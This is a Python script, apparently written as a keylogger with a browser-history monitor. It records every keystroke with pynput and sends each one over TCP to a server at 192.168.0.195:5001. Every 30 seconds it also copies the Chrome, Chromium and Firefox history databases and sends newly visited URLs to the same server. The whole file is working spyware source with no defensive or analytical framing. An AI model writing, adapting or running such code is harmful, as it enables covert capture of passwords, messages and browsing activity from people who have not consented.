import socket
from pynput import keyboard
from datetime import datetime
import threading
import time
import os
import sqlite3
import shutil

SERVER_IP = '192.168.0.195'
SERVER_PORT = 5001

# Track last seen URLs to avoid duplicates
seen_urls = set()

# Paths for browser history
CHROME_HISTORY_PATH = os.path.expanduser('~/.config/google-chrome/Default/History')
CHROMIUM_HISTORY_PATH = os.path.expanduser('~/.config/chromium/Default/History')
FIREFOX_PROFILE_DIR = os.path.expanduser('~/.mozilla/firefox')


def send_log(data):
    try:
        print(f"[LOG] Sending data: {repr(data)}")  # Console log
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data.encode())
        print("[LOG] Data sent successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to send log: {e}")

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f'<{key}>'
    print(f"[KEY] Pressed: {k}")  # Console log
    send_log(k)

def on_release(key):
    print(f"[KEY] Released: {key}")  # Console log
    if key == keyboard.Key.esc:
        print("[INFO] Escape key released, exiting listener.")
        return False

def get_chrome_history(path):
    urls = []
    if os.path.exists(path):
        print(f"[BROWSER] Found Chrome/Chromium history at: {path}")
        # Copy the file to avoid lock issues
        tmp_path = '/tmp/chrome_history_copy'
        try:
            shutil.copy2(path, tmp_path)
            print(f"[BROWSER] Copied history DB to: {tmp_path}")
            conn = sqlite3.connect(tmp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20')
            for url, _ in cursor.fetchall():
                urls.append(url)
            print(f"[BROWSER] Retrieved {len(urls)} Chrome/Chromium URLs.")
            conn.close()
            os.remove(tmp_path)
        except Exception as e:
            print(f"[ERROR] Failed to get Chrome/Chromium history: {e}")
    else:
        print(f"[BROWSER] Chrome/Chromium history not found at: {path}")
    return urls

def get_firefox_history():
    urls = []
    if os.path.exists(FIREFOX_PROFILE_DIR):
        print(f"[BROWSER] Found Firefox profile dir: {FIREFOX_PROFILE_DIR}")
        for profile in os.listdir(FIREFOX_PROFILE_DIR):
            places_path = os.path.join(FIREFOX_PROFILE_DIR, profile, 'places.sqlite')
            if os.path.exists(places_path):
                print(f"[BROWSER] Found Firefox history DB: {places_path}")
                tmp_path = '/tmp/firefox_history_copy'
                try:
                    shutil.copy2(places_path, tmp_path)
                    print(f"[BROWSER] Copied Firefox history DB to: {tmp_path}")
                    conn = sqlite3.connect(tmp_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT url, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 20')
                    for url, _ in cursor.fetchall():
                        urls.append(url)
                    print(f"[BROWSER] Retrieved {len(urls)} Firefox URLs from profile {profile}.")
                    conn.close()
                    os.remove(tmp_path)
                except Exception as e:
                    print(f"[ERROR] Failed to get Firefox history from {places_path}: {e}")
            else:
                print(f"[BROWSER] Firefox history DB not found in profile: {profile}")
    else:
        print(f"[BROWSER] Firefox profile dir not found: {FIREFOX_PROFILE_DIR}")
    return urls

def browser_history_monitor():
    print("[INFO] Browser history monitor started.")
    while True:
        urls = set()
        # Chrome/Chromium
        chrome_urls = get_chrome_history(CHROME_HISTORY_PATH)
        chromium_urls = get_chrome_history(CHROMIUM_HISTORY_PATH)
        firefox_urls = get_firefox_history()
        urls.update(chrome_urls)
        urls.update(chromium_urls)
        urls.update(firefox_urls)
        new_urls = urls - seen_urls
        print(f"[INFO] Found {len(new_urls)} new browser URLs.")
        for url in new_urls:
            print(f"[BROWSER] New URL: {url}")
            send_log(f'[BROWSER] {url}\n')
        seen_urls.update(new_urls)
        time.sleep(30)

def start_browser_monitor():
    print("[INFO] Starting browser history monitor thread.")
    t = threading.Thread(target=browser_history_monitor, daemon=True)
    t.start()

if __name__ == '__main__':
    print("[INFO] Keylogger and browser monitor starting.")
    start_browser_monitor()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("[INFO] Keyboard listener started. Press ESC to exit.")
        listener.join() 